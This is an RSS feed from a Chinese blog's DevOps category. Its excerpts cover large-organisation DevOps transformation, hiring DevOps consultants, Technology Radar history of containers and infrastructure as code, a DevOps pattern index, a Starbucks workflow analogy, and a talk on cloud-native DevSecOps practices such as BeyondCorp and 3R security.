<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>DevOps on 顾宇的博客</title><link>https://wwww.guyu.me/categories/devops/</link><description>Recent content in DevOps on 顾宇的博客</description><generator>Hugo -- gohugo.io</generator><language>zh</language><lastBuildDate>Fri, 06 Dec 2019 00:00:00 +0000</lastBuildDate><atom:link href="https://wwww.guyu.me/categories/devops/index.xml" rel="self" type="application/rss+xml"/><item><title>千人规模组织级 DevOps 演进的 9 个实践及技巧</title><link>https://wwww.guyu.me/posts/2019-12-06-devops-tips-for-large-org/</link><pubDate>Fri, 06 Dec 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-12-06-devops-tips-for-large-org/</guid><description>案例背景 # 在2018年年底，我参与了某一个大型产品团队的 DevOps 转型。这个产品的团队分为三个组织：产品业务部门（50多人），产品IT部门（250多人），以及产品的外包团队（800多人）。 经过产品化和微服务拆分后，组织开始以独立业务的方向划分。但是，由于之前的组织划分，团队并没有成为一个全功能的团队。而是采用原先的交付模式：业务部门提出需求，然后让IT部门开始设计解决方案，最后交给外包团队开发和测试。并且将测试团队和 计算平台团队变成各子产品的的公共资源，如下所示：
在这样的组织里，没交付一个产品需要 8 周的时间。按照原先的计划，2周完成需求分析，2周完成开发，2周完成产品的集成测试，2周完成用户验收测试，然后就进行发布，如下图所示：
然而，这个理想的计划并未得到实施。由于有些需求需要跨子产品，或者需求方案变更和延迟，导致需求延迟完成，使得接下来的环节相继延迟。然而，最核心的问题是版本计划不能根据变化调整，必须按照计划上线需求。因此，缺乏足够开发时间导致的不合格的软件半成品会堆到集成测试阶段。使得在用户验收测试阶段大量出现问题，“Bug”的数量爆发增长使得用户满意度大幅下降,如下图所示：
所以，用户希望通过 DevOps 能够弥合组织间的沟通间隙，将质量工作前移，减少Bug 数量并且缩短交付周期。在这个过程中，我总结了在50人以下的小型团队不会出现的关键问题以及对应的9个实践：
采用外部 DevOps 顾问 组织内部达成一致的 DevOps 理解和目标 采用改进而非转型减少转型风险和反弹 采用试点团队和推广团队 构建全功能团队并合并流程 提升需求质量 实践不同级别的 TDD 构建“比学赶超”的组织氛围 规范化管理实践并不断优化 聘用一个外部 DevOps 顾问 # 如果你是一个小型的团队，可以不用外部顾问。主要的原因是组织结构不复杂，很多事情只要团队能自主决策就能推动 DevOps 发展。
但如果你是一个大型组织，特别一个职能分工明确的组织向多个跨职能的全功能组织发展的时候，更多需要处理的是组织内部的复杂关系，重新切割和划分组织边界，组织内部就会出现矛盾。而 DevOps 顾问则是承接和转化矛盾的最理想人选。
那么，聘用一个外部 DevOps 顾问需要注意哪几点 # 首先，一个外部 DevOps 顾问需要至少两个以上企业或者客户的转型经验，特别是案例总结。因为不同企业在做 DevOps 的时候组织特点决定了不同的组织痛点和方法。做过多个企业的 DevOps 转型后，一个 DevOps 顾问就会明白这些区别。否则，就会把自己过去的经验“复制”过来，以为 DevOps 只有一种，从而拒绝学习组织现有的知识。那么就会盲目复制，导致转型效果和转型期望有很大差距。此外，“转型”是一门艺术，面对什么样的组织，采用什么样的话术和方法也是一门学问。这些细节也会影响 DevOps 转型的效果。
然后，DevOps 改进涉及到管理提升和技术提升两个方面。DevOps 顾问除了要具备精益，敏捷的管理实践。还要具备自动化测试、自动化运维、持续交付等技术能力。管理实践和技术实践两者都不可少，没有了管理实践，技术实践往往沦落为“工具赌博”，很多买来的工具都没有起到效果。没有了技术实践，管理实践也无法通过自动化取得进展。技术实践和管理实践相辅相成，技术实践是落地管理实践的手段和工具。只有二者紧密结合，才能发出最好的效果。
最后，DevOps 顾问一定要可以和团队在一起实践，而非在一边“指挥”。有一些 DevOps 教练没有动手实践过，只是“知道”，而非“做到”。这里面就会有很大的风险因素在里面，任何一个实践的落地和见效需要投入和时间。魔鬼都藏在细节里。如果没有做过，就难以避开转型上的“暗礁”
所以，在面试 DevOps 顾问的时候，要问 DevOps 顾问之前的转型案例，特别是的关注的点。而且不光要有管理实践，还有技术实践。在面试这些的内容的时候不光要讲方法论，还要讲采用什么工具如何落地。落地中间的困难点和关键点事什么。
为什么招聘一个 DevOps 专家转型效果不好 # 你可能会想，不如招聘一个 DevOps 专家来做。不是说不可以，而是说不要对这种方式做 DevOps 转型抱太高期望。因为他的工作也会受组织制度的制约。为了能够在组织生存下去，避免风险，他就会避免矛盾的发生。而这些矛盾的突破才是转型的关键。因此，聘用一个 DevOps 专家很难解决一些“顽疾”。
其次，很多专家会将自己的 DevOps 经验“复制”过来。然而，除了 DevOps 的实践本身以外。“转型”也是一系列技巧，如何获得信任，调整对方的预期，如何与对方沟通，在组织内应该说什么不应该说什么，以及怎么说怎么做都是技巧。没有做过“转型”的专家往往会忽略这些关键的细节。
在这个项目上工作了四个月之后，客户自己招聘了一个资深的应用架构专家。这个应用架构专家只有一家企业的 DevOps 经历，并没有“转型”经验。他申请来做 DevOps 转型。但他低估了 DevOps 转型在组织内部和各利益方的矛盾和挑战，导致自己在转型的过程中“腹背受敌”：如果不继续，自己工作的绩效受影响。如果继续做，又要面对同事之间的矛盾。
DevOps 顾问的另外一个工作就是要根据一套评估模型来对组织当前的状态进行评估，并给出改进建议。但无论什么样的成熟度模型，要兼顾到不同组织，所以大部分都是定性的条目。也就是说，职能给出“是”或“否”的结论，比如，发布周期是以“月”计算还是以“周”计算。但很难给出定量的结论，比如是三周好还是四周好。所以，如果你需要一些定量性的改进建议，就需要进一步定制化的进行度量。
建立 DevOps 共识 # DevOps 是一个抽象的概念，也缺乏一个定义。因此，每个人对 DevOps 的理解各不相同。DevOps 运动刚兴起的时候，每个人都会纠结“DevOps 是什么?</description></item><item><title>DevOps 模式 - 引入 DevOps 顾问</title><link>https://wwww.guyu.me/posts/2019-07-13-devops-pattern-introduce-devops-consultant/</link><pubDate>Sat, 13 Jul 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-07-13-devops-pattern-introduce-devops-consultant/</guid><description>很多企业并不是 DevOps 运动的早期玩家。当开始注意到 DevOps 的时候，想快速达到 DevOps 实践领先企业的效果，会引入有经验的 DevOps 顾问进行快速的转型。
然而，短期的 DevOps 顾问合同如果不能帮助团队构建 DevOps 制度和 DevOps 文化，DevOps 转型的效果将随 DevOps 专家的离开而离开，使团队得到“DevOps 不适用”的错觉。因此，在引入 DevOps 专家顾问的时候，我们一定要明确 请 DevOps 顾问的目的以及 DevOps 顾问留下的东西。
模式：引入 DevOps 顾问 (Introduce DevOps Consultant) # 模式名称：引入 DevOps 顾问 (Introduce DevOps Consultant)
模式别名：引入 DevOps 专家，引入 DevOps 教练
模式类别： 策略模式
风险： 中 - 采用的时候要注意场景和条件，否则会出现反模式。
价值：中 - 采用该模式产生中期固定的收益，但要持续做才可以获得收益。
见效时间：快 - 2 周内可看到显著改进。
说明：
引入 DevOps 顾问需要注意以下几点： DevOps 顾问要对 DevOps 的历史和来龙去脉有起码的理解。 DevOps 顾问要有不同的转型案例，如果只有一类企业的 DevOps 转型案例，在转型的过程中很容易进入“路径依赖”，认为 DevOps 转型只有一种。所以，DevOps 顾问要问不同案例中的差异的区别。 DevOps 顾问要同时引入管理转型实践和技术实践。缺乏 DevOps 管理实践会导致 DevOps 转型失去方向和效果。缺乏 DevOps 技术实践会让 DevOps 难以落地。 把你的具体问题抛给 DevOps 顾问，让他提出问题和观点。 关注 DevOps 顾问在上述各种描述中对 CLAMS 原则的应用。 DevOps 顾问需要可以和团队“一起做”，而不是“在一边看”。 DevOps 顾问要能给出对于组织的 DevOps 评估，并且根据评估给出能够落地的解决方案。 DevOps 顾问要根据 DevOps 评估的内容，帮助组织构建出 DevOps 文化、技术实践，以及相应的制度。 警惕那些对组织特征、组织痛点和转型范围不提问题的 DevOps 顾问。 相关模式：DevOps 评估，DevOps 转型，DevOps 改进</description></item><item><title>从技术雷达看 DevOps 的十年——容器技术与微服务</title><link>https://wwww.guyu.me/posts/2019-07-21-devops-and-techradar-anniversary-docker-and-microservices/</link><pubDate>Thu, 11 Jul 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-07-21-devops-and-techradar-anniversary-docker-and-microservices/</guid><description>本文原文发表于 2019 年 7 月 11 日的 ThoughtWorks 洞见，后经过修改发表到博客上。
在上一篇文章中，我们讲到了基础设施即代码和云计算给运维领域带来的深远影响。而 DevOps 运动不仅仅改变了运维端，同时也改变了开发端，特别是 Docker 的兴起和微服务架构的流行。在这一篇，我们将通过技术雷达上相关条目的变化来考察 Docker 和微服务的发展。
容器技术 # 在 Docker 技术出现之前，可以说是 DevOps 技术的 1.0 的时代，人们关注如何做好 CI/CD 和基础设施即代码。而 Docker 的出现迎来了 DevOps 2.0 时代，DevOps 所有的实践都围绕着 Docker 展开，以 Docker 为中心的技术架构影响了软件开发交付的方方面面。无论是开发还是运维都在讨论和使用 Docker。它们采用统一的交付格式和技术语言在讨论交付的过程，而不像之前开发只关注“打包前”，运维只关注“打包后”。
技术雷达关注 Linux 容器技术是在 Docker 出现之前，在 2012 年 4 月 的技术雷达上。“Linux 容器” 就出现在了技术雷达上的 “试验” 区域：
虚拟容器是一种对 SaaS 和 PaaS 实现特别有吸引力的虚拟化风格。OpenVZ 等 Linux 容器提供了虚拟机的隔离和管理优势, 而不需要通常与通用虚拟化相关的开销。在容器模型中, Guest 操作系统仅限于与 Host 主机操作系统相同, 但这对许多云应用程序来说并不是一个严重的限制。
一年之后，Docker 问世。两年之后，Docker 进入技术雷达。
容器技术 1.0：&amp;ldquo;轻量级的 Vagrant？&amp;rdquo; # 在 Docker 出现之前，DevOps 社区就广泛采用 Vagrant 测试 Chef 或者 Puppet 做基础设施即代码。所以，当我第一次看到 Docker 时，就感觉就是一个”轻量级的 Vagrant”。它们的思路几乎一致：
Vagrant 通过 Ruby 语法的 Vagrantfile 构建一个虚拟机。而 Docker 通过 Dockerfile 构建一个容器。 Vagrant 通过 package 命令构建一个可复制虚拟机的镜像。而 Docker 通过 build 构建一个镜像。 Vagrant 通过 upload 将虚拟机镜像上传至 box 分享站点。而 Docker 通过 push 将镜像上传至 image 分享站点。 此外，每一个 Vagrant 命令，你都可以找到一个对应的Docker 命令。</description></item><item><title>DevOps 模式 - 索引</title><link>https://wwww.guyu.me/posts/2019-06-03-devops-patterns-index/</link><pubDate>Sun, 02 Jun 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-06-03-devops-patterns-index/</guid><description>我今天把 DevOps 模式和反模式做了一个简单的总结。如果全职写，半年可以写完。如果周更，需要两年，我怕自己烂尾，夜长梦多。
自己开的坑，含着泪也要把它填完。
DevOps 策略模式 # 模式：定义你的 DevOps 反模式：DevOps 教条主义 反模式：DevOps 复制者 模式：引入 DevOps 顾问 反模式：DevOps 专家依赖 模式：DevOps 评估 模式：DevOps 共识 反模式：片面的 DevOps 理解 模式：定义 DevOps 范围 模式：DevOps 三步工作法 模式：DevOps 团队复制 模式：DevOps 团队改进 模式：DevOps 规范 反模式：缺乏管理约束的 DevOps 规范 反模式：缺乏技术约束的 DevOps 规范 模式：测试计划驱动开发计划 案例-01：每个人自己的 DevOps 案例-02：不同范围下的 DevOps 策略 案例-03：DevOps 团队复制 vs DevOps 团队改进 DevOps 组织模式 # 模式：DevOps 试点团队 模式：DevOps 推广团队 模式：Dev 团队含 Ops 成员 模式：Dev 团队共享 Ops 团队 模式：BAU 团队和特性团队 反模式：职责过多的 DevOps 团队 反模式：全栈工程师 模式：独立的质量控制团队 反模式：屈服于交付压力的质量控制团队 案例-01：屈服于交付压力的质量控制团队 DevOps 管理模式 # 模式：最小可用流程 模式：DevOps 看板 模式：累计流图 模式：四类任务 模式：DevOps 关键指标 模式：定制化 DevOps 度量 反模式：没有度量的DevOps 模式：包含 Ops 的 Scrum 模式：质量内建 模式：质量保证和质量控制 反模式：过程质量 Over 结果质量 模式：DevOps 技能矩阵 模式：测试人员驱动开发人员 案例-01：结合质量控制的质量保证流程 案例-02：交付 QA 和流程 QA DevOps 文化模式 # 模式：DevOps 比学赶超 模式：CLAMS 反思 模式：DevOps 回顾会议 模式：DevOps 大使 模式：反向管理 反模式：DevOps 指挥官 模式：我要做 DevOps 反模式：要我做 DevOps 模式：全员为质量负责 模式：DevOps 培训 反模式：DevOps 速成班 模式：DevOps 分享 反模式：封闭的 DevOps 模式：&amp;ldquo;如何定义&amp;quot;和&amp;quot;如何度量&amp;quot;问题 案例-01：规模化 DevOps 案例-02：正向管理 vs 反向管理 案例-03：通过分享增强自己的 DevOps 能力 DevOps 技术模式 # 模式：持续集成 反模式：持续集成表演 模式：持续部署 模式：基础设施即代码 模式：基础设施流水线 模式：自动化安全扫描 模式：测试驱动开发 反模式：过度自动化的 DevOps 模式：DevOps 平台 反模式：工具化 DevOps 反模式：基于组织映射的 DevOps 平台 模式：DesignOps 模式：混沌工程 模式：环境无关的应用程序 模式：环境相关的应用程序 模式：自部署的应用程序 反模式：知识太多的应用程序 反模式：基础设施依赖的应用程序 模式：12 Factors App 模式：BeyondCorp 模式：3R 企业安全 模式：微服务架构 反模式：微服务嫉妒 反模式：缺乏 DevOps 能力的微服务组织 模式：度量驱动的微服务 反模式：缺乏度量的微服务 模式：Serverless 应用架构 反模式：纳服务架构 案例-01：基于 Serverless 的微服务架构 案例-02：数据库变更流水线 关于 DevOps 模式 # DevOps 模式的索引在 Github 上开源，地址是https://github.</description></item><item><title>从技术雷达看 DevOps 的十年——基础设施即代码与云计算</title><link>https://wwww.guyu.me/posts/2019-05-21-devops-and-techradar-anniversary-infrastructure-as-code-and-cloud-computing/</link><pubDate>Tue, 21 May 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-05-21-devops-and-techradar-anniversary-infrastructure-as-code-and-cloud-computing/</guid><description>本文原文发表于 2019 年 5 月 21 日的 ThoughtWorks 洞见，后经过修改发表到博客上。
在上一篇文章中，我们讲到了DevOps 和持续交付的关系。本篇将回顾最先改变运维工作的相关技术 —— 基础设施即代码和云计算，通过技术雷达上相关条目的变动来跟踪其趋势变化。
基础设施即代码 # 和持续交付一样，基础设施即代码（Infrastructure as code）这项技术第一次在技术雷达出现就被纳入到了“采纳”环。
十年前，云计算的普及程度远不如当今。很多企业开始采用虚拟化技术（严格的说，那时候还不能称作是云）来解决资源不足和设备异构的问题。简单的说，你可以接虚拟化技术是在异构的设备上构建了一个通用适配层。使得各种不同的应用程序和设备能够通过通用的操作进行统一的管理，那时候面临这样问题多是通信、银行、政府、石油等关键领域。即便 IBM，Oracle，EMC 微软等都有“整体解决方案”，但为了避免供应商绑定风险，政府还是希望能够“混搭”：通过做大蛋糕来降低风险。当然，这种做法也降低了效率。然而当虚拟化技术解决了异构问题之后，基础设施资源被抽象为网络、计算、存储三类资源。由于业务的异构性，企业级领域迟迟没有解决方案。毕竟为了让虚拟化的资源能够尽快产出价值，往虚拟资源的迁移工作相关的集成工作占据了工作主要内容。
于是运维工程师和网络工程师慢慢远离机房，和系统工程师以及数据库工程师坐在了一起，共同成为了“脚本工程师”。
此时，Linux 开始通过 Xen 和 KVM 侵蚀传统 UNIX 厂商的市场份额。SCO，AIX 和 HP-UX 这些过去按卖 License 获得售后服务的方式毕竟太贵了。可以说，借由 Linux 虚拟化技术的云计算技术给商业 UNIX 来了一记补刀，如今你很少能看到这些商业 UNIX 了。
虚拟化技术把所有的空闲资源收集到了一起，这些资源完全可以在不增加基础设施设备投入的情况下运行更多的应用程序。拟化技术还可以通过整合小型设备，得到和大型设备一样的表现。
但是，如果你通过虚拟化节约出来的空闲资源你使用不了，但是还要收取电费，这就是很大的浪费。于是有些人则想到了把这些空闲的资源租出去，变成一个单独的业务。这就是另外一个故事了，我们稍后会提到。
随着 VMware，Oracle，Cisco，IBM 推出了各自的解决方案，“脚本工程师”们开始考虑如何管理大量的空闲资源。随着敏捷软件开发逐渐成为主流，基础设施的变更效率显然满足不了敏捷的迭代速度。基础设施的变更带来的风险和周期远远大于应用。如何让基础设施敏捷起来，成为了敏捷软件开发在交付最后一公里需要迫切解决的问题。
这时候，由于规模和复杂度都很大，脚本工程师们考虑的第一个问题就是：如果规模没办法改变，我们就降低复杂度吧。
Puppet 和 Chef 的短暂辉煌 # Puppet 是第一个嗅到这个商机的工具，它在第2010年8月的技术雷达上出现在了“试验”环里。
Ruby 很适合构建领域特定语言（DSL），继 Cucumber 在这方面的成功探索后，脚本工程师们希望通过 DSL 缩小 Dev 和 Ops 之间的差距。作为同一时期的竞争者，Chef 以对开发人员更加友好的方式出现。Chef 相比 Puppet 更有竞争力的一点就是对于 Windows 的支持。
不过，由于缺乏最佳实践，Puppet 和 Chef 很快就被玩坏了，复杂性的治理难度超过预期。随着治理规模的扩大，Puppet 和 Chef 带来的负面效应逐渐显现。曾经有人这样讽刺 Puppet：
Puppet 就像蟑螂。当你刚开始用了 Puppet，慢慢的你会发现你的代码库里到处都是 Puppet。
此外，事实证明 Ruby 是一个便于开发，但是难于维护的语言。Ruby 及其社区的频繁发布和不兼容特性使得后期接手维护的脚本工程师们叫苦不迭，加之 Ruby 工程师的招聘成本和培训成本都更高。即便 Ruby 的 Puppet 和 Chef 工具学习曲线比较平缓，但遗留的基础设施即代码的学习曲线却非常陡峭。基础设施的变更风险很大，且缺乏必要的质量实践，特别是主从模式的中心化还带来了单点故障和复杂度，这些都使得基础设施代码越来越难以维护。
在敏捷团队中，去中心化、自治的团队往往是被提倡的。于是 Puppet 推出了 standalone 模式，Chef 出现了 chef-solo 这样去中心化的特性。技术雷达很快就出现了与之相对的Librarian-puppet and Librarian-Chef 和 Masterless Chef/Puppet这样去中心化的实践。</description></item><item><title>从星巴克店面运营学习 DevOps</title><link>https://wwww.guyu.me/posts/2019-05-10-how-starbucks-play-devops/</link><pubDate>Fri, 10 May 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-05-10-how-starbucks-play-devops/</guid><description>某次在星巴克等咖啡的时候，闲来无事开始观察店员的的工作。可能是出于职业习惯，我开始观察和分析星巴克的工作流程。突然发现星巴克的咖啡交付过程很像一个敏捷软件开发团队的交付过程。后来通过进一步观察和细聊，发现星巴克的店面运营是一个 DevOps 运作的榜样。
如果我们把星巴克的店员们看做是一个开发/运维团队，把咖啡的交付看作软件的交付，把店面的基础设施维护和清洁看作是运维工作。我们就发现了一个很好的 DevOps 学习榜样。
让我们看看星巴克店面是如何做 DevOps 的。
星巴克咖啡交付团队的角色组成 # 在星巴克里，大家都相互称对方为星伙伴。我个人理解是通过弱化职级称谓提升每个人的责任心。所有的店员分为四个角色：
店面主管（SS或IC）：负责店面整体的管理。
收银：负责点单、推荐产品和收款。
吧台：负责制作饮品。
CS：负责门店补货，清理桌面。
店面主管主要负责团队的任务安排，你可以把它当做是 PM 或者 Scrum Master。在一切都井然有序的情况下，他的工作和一般的员工是一样的。只要他发现了临时需要处理的情况，他才会根据店面的资源来安排临时性的工作。
吧台内部分为三个部分：收银点单区、咖啡制作区、咖啡待取区，如下图所示：
收银点单区的店员根据客人的需求点单，然后记录到咖啡杯上。
咖啡制作区的店员会根据杯子上的标记制作饮品。
制作完成后的咖啡会放到咖啡待取区等客人来取。
所有的店员都具备所有的技能（全栈工程师），并通过标准化的考试上岗。你会看到在星巴克里有绿色围裙和黑色围裙。黑色围裙的咖啡师是经过考试的，考试合格后会发黑色围裙作为通过认证的标志。
反思：你的工程师有标准化的技能考试吗？
星巴克咖啡交付团队的 DevOps 单向工作流 # 说到 DevOps，不能不提到&amp;quot;三步工作法&amp;quot;。首先，我们要用到第一步——构建端到端单向工作流——来观察星巴克店面是如何构建单向工作流的。
我们可以把交付一杯咖啡的流程和软件开发的交付一个用户故事的流程的关系做如下对应：
需求分析：和客人交流并记录客人对咖啡的需求。
产品开发：按照需求制作咖啡。
产品发布：制作完成并通知客人取咖啡。
基础设施运维：咖啡店面的日常清扫和补货。
在这个基础上，我们看看一杯咖啡从点单开始，星巴克的持续交付流水线就是它设备的摆放顺序，确保杯子的单一方向流动，避免返工和逆向流动。
点单：虽然星巴克的咖啡是流水化工业制品。但是也是存在定制的，比如类别、口味、冷热、大小。虽然顾客有需求，但需求控制在一定范围之内(哪些做得到，哪些做不到)并且通过产品价位板告知顾客。
反思：你的团队能做什么，不能做什么，什么时候做完，你是否对交付成果有信心？这些信心来自哪里？如果没有信心，如何获得信心？
标记：在点单阶段，收银会把客户的每一个需求记录到杯子上，包括顾客的姓名。星巴克咖啡采取的是“预付费”(先付费再生产)而非“后付费”（先生产再买单）的方式。这些记录是对一杯咖啡需求验收标准的分解。通过杯子大小来控制每个需求点的验收和用量。
反思：你的团队开发需求时是否把每个验收条件记录下来并且在不同的阶段控制质量和用时？
制作：每个带着记号的咖啡杯就是一个格式化的需求文档。上面详细的记录了这个顾客的需求，并且这些需求可以验证。每杯咖啡都有标准的验收样例和工序，所以每个店员都知道完成的标准是什么。这样，即便不是点单的店员，看到杯子上的记号，也能做出符合顾客验收条件的咖啡。此外，每个杯子上都会有顾客姓名的标记，以免点错单。
反思：你的团队需求文档中的信息是否可以做到无解释交接？
出品：星巴克“完成”的定义是“顾客拿到了咖啡”，而不是“咖啡制作完毕”。如果顾客没有确认拿到的咖啡符合需求，是没有完成的。如果顾客对咖啡不满意，是可以要求重做的。这时候，会由专门的店员负责重新制作咖啡，直到顾客满意为止。
反思：你的软件开发流程中“完成”的定义是开发完成？测试完成？还是上线发布完成？
制作区运营：星巴克从点单开始，到制作咖啡过程中所有的设备、物料、卫生等都要每天维护使之保持最佳使用状态。这些基础设施的使用都是高可用且可以按需伸缩的：两个收银机、两台咖啡机——如果一台坏了，有另外一台备份。默认情况下只使用一台，如果到了忙时两台才会同时使用。这一切都要通过星巴克店面的看板信号机制来动态协调。
反思：你的软件交付基础设施和人员是否具备动态协调的能力？为什么？
星巴克咖啡交付的看板系统 # 当我们构建了单向的价值流之后，来看看星巴克是如何应用 DevOps 第二工作法——构建快速反馈的。
首先，从上述流程中，我们可以看到星巴克的四个积压队列(Backlog)，分别是：点单队列、待制咖啡队列、制作中咖啡队列、待取咖啡队列。
这四个队列构成了星巴克咖啡交付的看板系统，每个环节都是一个单独的队列，并且通过不同的看板可视化积压情况。
点单队列 # 如果你正在点单，收银员会在你犹豫的时候帮你推荐。然后它会记下你姓名，咖啡的类别和定制化的要求。并记录在杯子上，放到待做咖啡队列。
一般星巴克的店面都会有两个收银台。平常的情况下只有一名星伙伴收银。如果有客户在收银机排队，就是需求分析资源不足的信号，收银台需要补人。收银台补人的原则是把两个人看作一个单位，如果超出了 2.5 个单位。收银台需要再补充另外一个人。如果两个收银还是不够，值班主管会让一个伙伴拿着点单卡(如下图)提前记录客人需要。这样可以节约在收银台前的时候，客人选择和犹豫时耽误的时间。
这样就避免了点单队列（需求分析）的积压。
待做咖啡杯队列和饮品制作流水线 # 此时待做咖啡队列就是一个个打上标记的空杯子。当空杯子数量超过5个，吧台里就需要有第二个人参与咖啡的制作，以减少待做队列里的积压。
简单的说，一杯标准的意式咖啡会包括三个环节：
制作浓缩咖啡(Espresso)。 制作奶沫。 混合并添加糖浆/冰块等配料。 在这三步中，第一步制作浓缩咖啡是需要等待的，在这期间星伙伴可以选择同时做其它的咖啡、制作奶沫或者增加配料。所以，咖啡不是一杯一杯交付的，而是一批一批交付的。</description></item><item><title>从技术雷达看 DevOps 的十年——DevOps与持续交付</title><link>https://wwww.guyu.me/posts/2019-04-16-devops-and-techradar-anniversary-devops-and-continous-delivery/</link><pubDate>Tue, 16 Apr 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-04-16-devops-and-techradar-anniversary-devops-and-continous-delivery/</guid><description>本文原文发表于 2019 年 4 月 16 日的 ThoughtWorks 洞见，后经过修改发表到博客上。
2009 年底，比利时根特举办了第一届 DevOpsDays。ThoughtWorks 的咨询师Chris-Read 作为嘉宾之一，代表 ThoughtWorks 出席了这次活动并带来名为 “持续集成，流水线和部署”的演讲。ThoughtWorks 作为 DevOps 运动最早的见证者和奠基人，并没有意识到这个周末聚会将在接下来 10 年给全球 IT 行业带来的深远影响。
1 个月后，ThoughtWorks 发布了第一期的技术雷达。作为一个新兴的名词，DevOps 还没有成熟到让令人瞩目的阶段。然而，即便 DevOps 还没有被纳入技术雷达，但与之相关的早期实践和工具都已出现。在接下来的十年中，DevOps 已经成为每期技术雷达不可或缺的一部分。从这个角度上说，技术雷达就是 DevOps 发展的见证者。
DevOps 和技术雷达都将迎来自己的不愁之年。作为 IT 行业技术的先行指标，技术雷达上面的技术平均领先行业 3 至 5 年。也就是说，出现在技术雷达 采纳和 试用区域的技术，在 3 - 5 年后大概率将成为业界主流。
作为 DevOps 和技术雷达的粉丝，我想从技术雷达的角度总结 DevOps 的发展历程。该系列文章共分为三篇，分别是：
DevOps 和持续交付 基础设施即代码和云计算 容器技术和微服务 本文为“DevOps 和技术雷达的十年”系列文章第一篇：DevOps 和 持续交付。
DevOps # 虽然持续集成、构建流水线和持续部署从技术雷达创刊号就存在。但 DevOps 作为一个正式条目进入技术雷达的评估象限是在 2010 年 8月的第三期技术雷达。那时，对 DevOps 的描述是这样的：
DevOps 是一个新的运动，在寻找可以满足业务需要的快速交付的软件和稳定的生产环境。它拥有两个目标：首先， 让开发和运维的合作更加紧密。其次，在运维流程中应用敏捷实践（协作，自动化，简单化）来处理初始化虚拟机，变更管理和生产环境监控。它包含文化、流程和工具，全部用于支持更好的沟通，快速的交付和反馈以及可预测的产出上。
半年后，DevOps 运动所引发的影响越来越大。2011 年 1 月，DevOps 作为条目进入了 “试用” 区域。这意味着至少 ThoughtWorks 内部已经全然接受 DevOps 。在这一期的技术雷达中，对 DevOps 的描述做了一些调整：
DevOps 运动持续让人们关注经常断裂的开发和运维关系。DevOps 提升了开发和运维的合作以及共同的责任。DevOps 在运维过程中应用敏捷实践, 初始化虚拟机，变更管理和生产环境监控并为开发阶段引入了近似生产环境的思维，工具和环境。DevOps 是对一个想对应用发布到生产环境实施持续交付的关键基础。</description></item><item><title>云原生下的 DevSecOps 实践</title><link>https://wwww.guyu.me/posts/2019-03-17-cloudnative-devsecops-practices/</link><pubDate>Sun, 17 Mar 2019 00:00:00 +0000</pubDate><guid>https://wwww.guyu.me/posts/2019-03-17-cloudnative-devsecops-practices/</guid><description>云原生的安全挑战 # 云环境的安全跟企业内网的安全是不一样的，有可能我做一个网络分段，拔一根网线就安全了，但是云计算是不太一样的。先说一下在 DevOps 的发展历程中安全相关的发展，在 DevOps 运动的早期，你会看家大家是不提安全的，只提合作和自动化。
怎么样把开发和运维两端能够更快的进行沟通，提出我们的交付效率和问题响应速度，安全仍然只是传统运维上已经有的安全内容，但是并不会单独考虑安全在 DevOps 中的重要性。
但是你会发现慢慢的随着自动化程度增强，你会觉得这个安全也是实践 DevOps 中的一个瓶颈，你要解决这个问题，我不如把安全放到 DevOps 整个环里面作为重要的一环来考虑，我们会把一些安全的手段自动化加入到 DevOps 流程中。
像昨天讲到的，我们会把一些扫描放到持续交付流水线里面，我们会在线做一些验证，但是这些所谓的 DevOps 更多的有 DevOps 网站，我们把安全手段通过自动化的方式加入到 DevOps 的反馈环和流水线，这就是 DevSecOps。
然而，在云原生环境下，我们需要在一个安全的框架下，重新考虑 DevOps，设计DevOps 的人员、场景、使用。通过更多的方式，而不仅仅是自动化的方式，在座有没有做安全的同学？有没有做 DBA 数据库的？有点可惜。
希望大家可以理解。你在做安全的时候，你会发现更多的安全问题是人为因素。因为我们技术上的保证尤其是在运维层面已经非常成熟了，你只要符合某个规范，把安全的点都考虑到，其实你运维端的安全就已经做得不错了。
我们可能偏向于应用端的安全，应用端的安全有一个BSI，在你的整个应用开发周期里面考虑安全因素，你的应用有可能是你的安全最大的漏洞。但是你考虑这一点以后，你会发现DevOps不好串起来、也不好用，我们要考虑人的因素在DevOps体系里面是怎么样的。
软件定义安全 # 在座了解 BeyondCorp 的同学有吗？谷歌去年发表了一篇论文，这篇论文讲的是在未来的云环境下怎么定义安全。因为在云环境下要连接第三方服务和不同供应商之间就会更加复杂，它安不安全你是不知道的，它不安全会造成非常大的损失，它所能受到的是很大的影响。 这是一个模型，有相应的论文，后面我会把论文全篇发送给大家。他在里面讲到三个原则：
第一个原则是所有网络都不可信，所有网络包括你自己的网络都是不可信的，比如在企业里面我的PC笔记本电脑和企业无线路由器连接的网络也是不可信的，你不要以为在企业里面有企业内网，电脑设备就一定安全了，这种情况下在 BeyondCorp 里面所有网络都是不可信的。
第二是基于已知的用户和设备进行授权访问，如果网络是不可信的，你要访问资源一定要经过用户和设备进行授权访问。在座的有没有不知道是MFA多因子认证的？MFA是我们比较通用的一个实践，在如何确定你是你的问题上，这几个元素里面、这几个因子里面，你只要满足其中两个就可以证明你是你。
第三个原则是对所有服务的访问必须进行身份验证，授权和加密。我们想到再做一个安全小调查，从用户的输入开始到最后存储数据库里面所有部分都进行加密的同学请举手，我们可能想到第一个问题是麻烦，第二个问题是可能有性能问题，现在加密技术的性能还是不错的，但是会有一些麻烦，而麻烦和应用性之间是有一个平衡的。在这里面我们在Beynod和Corp里面，为了保证数据安全性，我们一定要做身份授权和加密。
另外一个是3R企业安全—云原生的安全，这是他们给的标题，我觉得这个非常不错。有没有听过3R企业安全的？这证明我的实践比较新，这也是去年的实践。什么叫3R呢？一是Rotate，经常更新用户的口令，每天都更新数据库密码的同学请举手？一天更新几次？
这个做得不错，等一会儿我要介绍跟你一样的实践。二是Repave从0开始构建，每天从基础设施开始构建的同学请举手，我的网络和机器全部拆掉了，每天把应用重新构建一次，没有，我举手。三是Repair及时打补丁，这个我相信有同学做吧，每天做这个的举手，你们的运维做得非常不错，等一会儿解释一下。
